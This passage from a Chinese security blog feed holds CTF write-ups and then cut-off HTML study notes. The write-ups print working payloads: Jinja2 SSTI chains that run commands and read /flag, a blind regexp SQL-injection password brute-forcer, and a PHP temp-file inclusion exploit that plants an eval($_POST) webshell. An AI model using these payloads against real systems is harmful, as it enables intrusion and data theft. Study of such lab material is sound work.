src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211111724780.png" alt="image-20220211111724780"></a></p><p>然后我们再讲一讲自己如何撸出来一个payload，做法就是寻找可利用的类。</p><p>1、有popen()的类</p><pre><code>os._wrap_closepayload:&#123;&#123;"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>2、有os模块的</p><p>socket._socketobject（一般在71）、site._Printer等模块</p><pre><code>payload:&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;</code></pre><p>3、有builtins的类</p><p>__ builtins __代码执行（最常用的方法）</p><p>warnings.catch_warnings含有,常用的还有email.header._ValueFormatter</p><p>__ builtins __   是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如abs，max，就是因为__ builtins   __ 这类模块在Python启动时为我们导入了，可以使用dir(__ builtins __ )来查看调用方法的列表，然后可以发现__   builtins __ 下有eval，__ import __等的函数，因此可以利用此来执行命令。</p><p>好了，接下来进行实践。</p><p>我们把所有子类列出来</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112131255.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112131255.png" alt="image-20220211112131255"></a></p><p>好家伙出来了很多啊，我们只需要找到我们需要的就好，我们用python脚本跑一下</p><pre><code>import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p>我们先来找下os._wrap_close</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112532522.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112532522.png" alt="image-20220211112532522"></a></p><p>已经出来了在132位，那么我们就可以构造一个payload</p><pre><code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>我们来测试一下是否可以</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112709595.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112709595.png" alt="image-20220211112709595"></a></p><p>成功列出来了文件。</p><p>直接读取flag</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112747491.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112747491.png" alt="image-20220211112747491"></a></p><p>同理，可以利用的类还有很多啊，</p><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112931751.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220211112931751.png" alt="image-20220211112931751"></a></p><p>就像这个类也在里面包含着，我们同样可以利用它来获取flag。</p><p>方法有很多，理解原理并掌握其中几种方法即可。</p><h2 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h2><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402142608573.png" alt="image-20220402142608573"></p><p>进去以后直接给你了sql语句。</p><p>先不管别的扫一下目录再说</p><p>发现xxx/robots.txt文件</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402143249697.png" alt="image-20220402143249697"></p><p>再到hin.txt查看<br><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402143334665.png" alt="image-20220402143334665"></p><p>给出了过滤得字符串，并且说的很明白如果得到admin得密码就可以得到flag，但是这里得过滤是非常严格得。</p><p>fuzz一下</p><p>发现regexp没有被过滤</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402143542801.png" alt="image-20220402143542801"></p><p>sql语句是</p><pre><code>select * from users where username = &#39;&#39; and passwd = &#39;&#39;</code></pre><p>我们可以再username中加反斜杠注释掉单引号</p><pre><code>select * from users where username = &#39;aaa\&#39; and passwd = &#39;||/**/passwd/**/regexp/**/&quot;^a&quot;;%00&#39;</code></pre><p>对a进行一个简单得fuzz，判断成功时得响应包</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402160348046.png" alt="image-20220402160348046"></p><p>发现y，响应包是一个302跳转，到welcome.php</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220402160421355.png" alt="image-20220402160421355"></p><p>根据这个就可以编写出payload</p><pre><code class="python">import timeimport requestsimport stringfrom urllib import parseres = &#39;&#39;url = &#39;http://494b5c51-766a-475c-b86d-320809ca2d50.node4.buuoj.cn:81/index.php&#39;string = string.digits + string.ascii_lowercase + &#39;_&#39; # 猜测密码由数字，小写字母和下划线组成for i in range(0, 200):    for s in string:        data = &#123;            &quot;username&quot;: &quot;sakura\\&quot;,            &quot;passwd&quot;: &quot;||/**/passwd/**/regexp/**/\&quot;^&#123;&#125;\&quot;;&#123;&#125;&quot;.format((res+s), parse.unquote(&#39;%00&#39;))        &#125;        response = requests.post(url, data)        print(response)        time.sleep(0.5)        if &quot;welcome&quot; in response.text:            res = res + s            print(res)        else:            continue</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130031558.png" alt="image-20220403130031558"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130154421.png" alt="image-20220403130154421"></p><h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p>进去直接显示这个</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130428719.png" alt="image-20220403130428719"></p><p>查看源代码，疑似hash长度扩展攻击</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403130441800.png" alt="image-20220403130441800"></p><p>抓取请求包，发现hash值</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403131445202.png" alt="image-20220403131445202"></p><p>直接pass传一下，发现提示文件</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403132151777.png" alt="image-20220403132151777"></p><p>发现文件包含</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403132341966.png" alt="image-20220403132341966"></p><p>扫一下目录</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403140421790.png" alt="image-20220403140421790"></p><p>读取下源码</p><p>index.php</p><pre><code class="php">&lt;?phpinclude &#39;config.php&#39;;@$name=$_GET[&#39;name&#39;];@$pass=$_GET[&#39;pass&#39;];if(md5($secret.$name)===$pass)&#123;    echo &#39;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;           window.location.href=&quot;flflflflag.php&quot;;    &lt;/script&gt;&#39;;&#125;else&#123;    setcookie(&quot;Hash&quot;,md5($secret.$name),time()+3600000);    echo &quot;username/password error&quot;;&#125;?&gt;&lt;html&gt;&lt;!--md5($secret.$name)===$pass --&gt;&lt;/html&gt;</code></pre><p>flflflflag.php</p><pre><code class="php">&lt;html&gt;&lt;head&gt;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;           window.location.href=&quot;404.html&quot;;&lt;/script&gt;&lt;title&gt;this_is_not_fl4g_and_åºé¢äºº_wants_girlfriend&lt;/title&gt;&lt;/head&gt;&lt;&gt;&lt;body&gt;&lt;?php$file=$_GET[&#39;file&#39;];if(preg_match(&#39;/data|input|zip/is&#39;,$file))&#123;    die(&#39;nonono&#39;);&#125;@include($file);echo &#39;include($_GET[&quot;file&quot;])&#39;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>config.php</p><pre><code class="php">&lt;?php$secret=&#39;%^$&amp;$#fffdflag_is_not_here_ha_ha&#39;;?&gt;</code></pre><p>dir.php</p><pre><code class="php">&lt;?phpvar_dump(scandir(&#39;/tmp&#39;));?&gt;</code></pre><p>由于伪协议被过滤，所以我们不能利用伪协议进行写马，这里考察得是php临时文件包含</p><p>php7 segment fault特性:<br>php://filter/string.strip_tags=/etc/passwd<br>php执行过程中出现 Segment Fault，这样如果在此同时上传文件，那么临时文件就会被保存在/tmp目录，不会被删除</p><p>具体可参阅文章:<a href="https://www.cnblogs.com/linuxsec/articles/11278477.html">https://www.cnblogs.com/linuxsec/articles/11278477.html</a></p><p>payload:</p><pre><code>import requestsfrom io import BytesIOurl = &#39;http://bcd936cd-a002-414f-ba12-3fabf74c16ae.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#39;payload = &quot;&lt;?php eval($_POST[&#39;x&#39;]) ?&gt;&quot;files = &#123;    &quot;file&quot;: BytesIO(payload.encode())&#125;try:    requests.post(url=url, files=files, allow_redirects=False)except:    print(&quot;false&quot;)</code></pre><p>查看dir.php，成功写入文件</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403144556928.png" alt="image-20220403144556928"></p><p>执行一句话木马，flag在phpinfo中</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403145618596.png" alt="image-20220403145618596"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403145643489.png" alt="image-20220403145643489"></p><h2 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150038070.png" alt="image-20220403150038070"></p><p>没有什么发现，尝试访问下secret</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150107744.png" alt="image-20220403150107744"></p><p>那我就把secret当作参数，传入一个值试一试</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150322198.png" alt="image-20220403150322198"></p><p>很明显，它把我输入得值进行了一个加密</p><p>没有什么发现，随便输入一些字符串，它就爆错了，，，</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150432386.png" alt="image-20220403150432386"></p><p>寻找可利用的信息</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403150631904.png" alt="image-20220403150631904"></p><p>找到了加密方式是RC4,存在render，应该是模板注入</p><p>这是一个RC4加密脚本</p><pre><code>import base64from urllib.parse import quotedef rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;):    # print(&quot;RC4加密主函数&quot;)    s_box = rc4_init_sbox(key)    crypt = str(rc4_excrypt(message, s_box))    return  cryptdef rc4_init_sbox(key):    s_box = list(range(256))  # 我这里没管秘钥小于256的情况，小于256不断重复填充即可    # print(&quot;原来的 s 盒：%s&quot; % s_box)    j = 0    for i in range(256):        j = (j + s_box[i] + ord(key[i % len(key)])) % 256        s_box[i], s_box[j] = s_box[j], s_box[i]    # print(&quot;混乱后的 s 盒：%s&quot;% s_box)    return s_boxdef rc4_excrypt(plain, box):    # print(&quot;调用加密程序成功。&quot;)    res = []    i = j = 0    for s in plain:        i = (i + 1) % 256        j = (j + box[i]) % 256        box[i], box[j] = box[j], box[i]        t = (box[i] + box[j]) % 256        k = box[t]        res.append(chr(ord(s) ^ k))    # print(&quot;res用于加密字符串，加密后是：%res&quot; %res)    cipher = &quot;&quot;.join(res)    print(&quot;加密后的字符串是：%s&quot; %quote(cipher))    #print(&quot;加密后的输出(经过编码):&quot;)    #print(str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))    return (str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))rc4_main(&quot;HereIsTreasure&quot;,&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()&#125;&#125;&quot;)</code></pre><p>首先列出所有子类</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403151137684.png" alt="image-20220403151137684"></p><p>传给secret</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403151206120.png" alt="image-20220403151206120"></p><p>寻找可利用子类</p><p>给出一个脚本</p><p>find.py</p><pre><code class="python">import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;subprocess.Popen&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p>寻找warnings.catch_warnings类</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403152312044.png" alt="image-20220403152312044"></p><p>payload</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[60].__init__.__globals__['__builtins__']['open']('/flag').read()&#125;&#125;</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220403152255110.png" alt="image-20220403152255110"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>html学习笔记</title>
      <link href="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="简单的HTML页面架构"><a href="#简单的HTML页面架构" class="headerlink" title="简单的HTML页面架构"></a>简单的HTML页面架构</h1><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;    &lt;/body&gt;&lt;/html&gt;charset  编码 gbk gbk2312 utf-8</code></pre><h1 id="HTML常见标签"><a href="#HTML常见标签" class="headerlink" title="HTML常见标签"></a>HTML常见标签</h1><h2 id="meta标签"><a href="#meta标签" class="headerlink" title="meta标签"></a>meta标签</h2><pre><code class="html">&lt;meta&gt; 元素可提供有关页面的元信息（meta-information），比如针对搜索引擎和更新频度的描述和关键词。设置网站关键字meta name=&quot;keywords&quot; content=&quot;网络安全，WEB渗透，数据安全，渗透测试，安全培训&quot; /&gt;&lt;link&gt; 标签定义文档与外部资源的关系。&lt;script&gt; 引入js文件注释&lt;!--这是一段注释。注释不会在浏览器中显示。--&gt;&lt;p&gt;这是一段普通的段落。&lt;/p&gt;</code></pre><p>简单demo</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;这里是sakura的博客&lt;/title&gt;        &lt;meta name=&quot;keywords&quot; content=&quot;网络安全，渗透测试，代码审计&quot;/&gt;        &lt;meta name=&quot;description&quot; content=&quot;这是sakura的博客，分享自己的学习经验&quot; /&gt;        &lt;meta name=&quot;author&quot; content=&quot;sakura&quot; /&gt;    &lt;/head&gt;    &lt;body&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>效果图:</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324154159328.png" alt="image-20220324154159328"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324154219201.png" alt="image-20220324154219201"></p><h2 id="标题标签"><a href="#标题标签" class="headerlink" title="标题标签"></a>标题标签</h2><pre><code class="html">由大到小&lt;h1&gt;h1&lt;/h1&gt;&lt;h2&gt;h2&lt;/h2&gt;&lt;h3&gt;h3&lt;/h3&gt;&lt;h4&gt;h4&lt;/h4&gt;&lt;h5&gt;h5&lt;/h5&gt;&lt;h6&gt;6&lt;/h6&gt;&lt;/br&gt; 换行标签&lt;hr&gt;换行线标签</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324155054152.png" alt="image-20220324155054152"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324155038536.png" alt="image-20220324155038536"></p><h2 id="文本属性"><a href="#文本属性" class="headerlink" title="文本属性"></a>文本属性</h2><pre><code class="html">&lt;strong&gt;加粗&lt;/strong&gt;&lt;b&gt;&lt;/b&gt;加粗&lt;i&gt;&lt;/i&gt;斜体&lt;u&gt;&lt;/u&gt; 下划线&lt;sup&gt;&lt;/sup&gt;上标&lt;sub&gt;&lt;/sub&gt;下标&lt;del&gt;&lt;/del&gt; 删除线&lt;font&gt;&lt;/font&gt; 规定字体属性    size 字体的大小    color 字体颜色    代码样式原样输出&lt;pre&gt;&lt;/pre&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324163340955.png" alt="image-20220324163340955"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324162943229.png" alt="image-20220324162943229"></p><h2 id="form表单"><a href="#form表单" class="headerlink" title="form表单"></a>form表单</h2><p>form表单 规定当提交表单时向何处发送表单数据</p><p>method 提交的方法有 get、post</p><p>规定在发送表单数据之前如何对其进行编码：</p><p><strong>enctype 属性可能的值：</strong></p><p>​        application/x-www-form-urlencoded</p><p>​        multipart/form-data</p><p>​        text/plain</p><p><strong>input标签:</strong></p><p>name：同样是表示的该文本输入框名称。</p><p>size：输入框的长度大小。</p><p>maxlength：输入框中允许输入字符的最大数。</p><p>value：输入框中的默认值</p><p>readonly：表示该框中只能显示，不能添加修改。</p><p><strong>input的类型:</strong></p><p>type=password 密码输入框</p><p>type=file 文件上传</p><p>type=hidden 隐藏域</p><p>button 按钮</p><p>checkbox 复选框</p><p>radio 单选框</p><p>type=submit 提交按钮</p><p>type=reset  重置按钮</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;这是一个表单e&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;            &lt;label&gt;用户名: &lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; size=&quot;30&quot; maxlength=&quot;6&quot; value=&quot;sakura&quot; readonly=&quot;&quot; /&gt;&lt;/br&gt;            &lt;label&gt;密&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;码:&lt;/label&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot;  /&gt;&lt;/br&gt;            &lt;label&gt;技&amp;nbsp;能:&lt;/label&gt;安全开发&lt;input type=&quot;checkbox&quot; /&gt;渗透测试&lt;input type=&quot;checkbox&quot; /&gt;&lt;/br&gt;            &lt;label&gt;性&amp;nbsp;别:&lt;/label&gt;男&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;1&quot; /&gt;女&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;2&quot; /&gt;            &lt;input type=&quot;hidden&quot; value=&quot;1&quot; /&gt;&lt;/br&gt;            &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt;            &lt;input type=&quot;reset&quot; value=&quot;重置&quot; /&gt;            &lt;input type=&quot;button&quot; value=&quot;button&quot; /&gt;        &lt;/form&gt;        &lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;            &lt;input type=&quot;file&quot; value=&quot;file&quot; /&gt;            &lt;input type=&quot;submit&quot; /&gt;        &lt;/form&gt;            &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324210305845.png" alt="image-20220324210305845"></p><h2 id="a标签、img标签、table标签"><a href="#a标签、img标签、table标签" class="headerlink" title="a标签、img标签、table标签"></a>a标签、img标签、table标签</h2><pre><code class="html">a标签的作用：就是用于控制界面与页面之间的跳转默认就是selfself：用于在当前选项卡中跳转，也就是不新建页面跳转_blank ：用于在新的选项卡中跳转，也就是新建页面跳转&lt;a href=&quot;http://www.baidu.com&quot; target=&quot;self&quot;&gt;百度&lt;/a&gt;&lt;a href=&quot;http://www.baidu.com&quot; target=&quot;_blank&quot;&gt;百度&lt;/a&gt;_blank    在新窗口中打开被链接文档。_self    默认。在相同的框架中打开被链接文档。_parent    在父框架集中打开被链接文档。_top    在整个窗口中打开被链接文档。</code></pre><h2 id="锚文本"><a href="#锚文本" class="headerlink" title="锚文本"></a>锚文本</h2><pre><code class="html">&lt;a name=&quot;top&quot;&gt;锚点&lt;/a&gt;&lt;a href=&quot;#top&quot;&gt;锚点&lt;/a&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324212519652.png" alt="image-20220324212519652"></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324212536673.png" alt="image-20220324212536673"></p><h2 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h2><pre><code class="html">img 元素向网页中嵌入一幅图像。&lt;img src=&quot;img/sakura.jpg&quot; width=&quot;400&quot; height=&quot;500&quot; alt=&quot;logo&quot;/&gt;alt 规定图像的替代文本。src  规定显示图像的urlwidth 规定图片的高度height 规定图片的宽度</code></pre><p>  <img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324213845918.png" alt="image-20220324213845918"></p><h2 id="table表格"><a href="#table表格" class="headerlink" title="table表格"></a>table表格</h2><pre><code class="html">&lt;caption&gt;我的标题&lt;/caption&gt;表格带标题border 边框width 宽度height 高度colspan 合并行rowspan 合并竖&lt;th&gt;&lt;/th&gt; 定义表格内的表头单元格&lt;tr&gt;行&lt;/tr&gt;&lt;td&gt;表格&lt;/td&gt;cellpadding 单元边与内容的空白cellspacing 单元格的空白</code></pre><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;table border=&quot;1&quot; cellpadding=&quot;10&quot; cellspacing=&quot;10&quot;&gt;            &lt;caption&gt;HY和WYF❤&lt;/caption&gt;            &lt;tr&gt;&lt;th&gt;#&lt;/th&gt;&lt;th&gt;姓名&lt;/th&gt;&lt;th&gt;年龄&lt;/th&gt;&lt;th&gt;在一起时间&lt;/th&gt;&lt;/tr&gt;            &lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;HY&lt;/td&gt;&lt;td&gt;20&lt;/td&gt;&lt;td rowspan=&quot;2&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;299天&lt;/td&gt;&lt;/tr&gt;            &lt;tr&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;WYF&lt;/td&gt;&lt;td&gt;20&lt;/td&gt;&lt;/tr&gt;        &lt;/table&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324220335722.png" alt="image-20220324220335722"></p><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><pre><code class="html">&lt;ul&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;&lt;/ul&gt;</code></pre><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><pre><code class="html">    项目符号 square circle disc&lt;ul&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;    &lt;li&gt;&lt;/li&gt;&lt;/ul&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324221810168.png" alt="image-20220324221810168"></p><h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><pre><code class="html">    数字列表 默认 数字    小写字母列表     大写字母列表 A    罗马字母列表  I    小写罗马字母列表 i&lt;ol type=&quot;1&quot;&gt; &lt;!--有序列表--&gt;            &lt;li&gt;暗月实战项目九 不出网的情况下的内网多域控渗透&lt;/li&gt;            &lt;li&gt;xp/2003开关3389指令&lt;/li&gt;            &lt;li&gt;一条命令修改windows注册表&lt;/li&gt;&lt;/ol&gt;</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220324222526957.png" alt="image-20220324222526957"></p><h2 id="框架使用"><a href="#框架使用" class="headerlink" title="框架使用"></a>框架使用</h2><p><strong>frameset 元素可定义一个框架集。它被用来组织多个窗口（框架）。每个框架存有独立的文档。在其最简单的应用中，frameset 元素仅仅会规定在框架集中存在多少列或多少行。您必须使用 cols 或 rows 属性。</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/clip_image002.png" alt="布局"></p><p>frameset 在一个页面中设置一个或多个框架 不能嵌套在body标签里</p><p>iframe 是在html页面内嵌入框架 框架内可以连接另一个页面</p><p> <strong>frameset属性:</strong></p><p>①border</p><p>设置框架的边框粗细。</p><p>②bordercolor</p><p>设置框架的边框颜色。</p><p>③frameborder</p><p>设置是否显示框架边框。设定值只有0、1；0 表示不要边框，1 表示要显示边框。</p><p>④cols</p><p>纵向分割页面。其数值表示方法有三种：“30%、30（或者30px）、<em>”；数值的个数代表分成的视窗数目且数值之间用“,”隔开。“30%”表示该框架区域占全部浏览器页面区域的30%；“30”表示该区域横向宽度为30像素；“</em>”表示该区域占用余下页面空间。例如：cols=”25%,200,*” 表示将页面分为三部分，左面部分占页面30%，中间横向宽度为200像素，页面余下的作为右面部分。</p><p>⑤rows</p><p>横向分割页面。数值表示方法与意义与cols相同。</p><p>⑥framespacing</p><p>设置框架与框架间的保留的空白距离。</p><p> <strong>frame属性:</strong></p><p>①name</p><p>设置框架名称。此为必须设置的属性。</p><p>②src</p><p>设置此框架要显示的网页名称或路径。此为必须设置的属性。</p><p>③scrolling</p><p>设置是否要显示滚动条。设定值为auto, yes, no。</p><p>auto 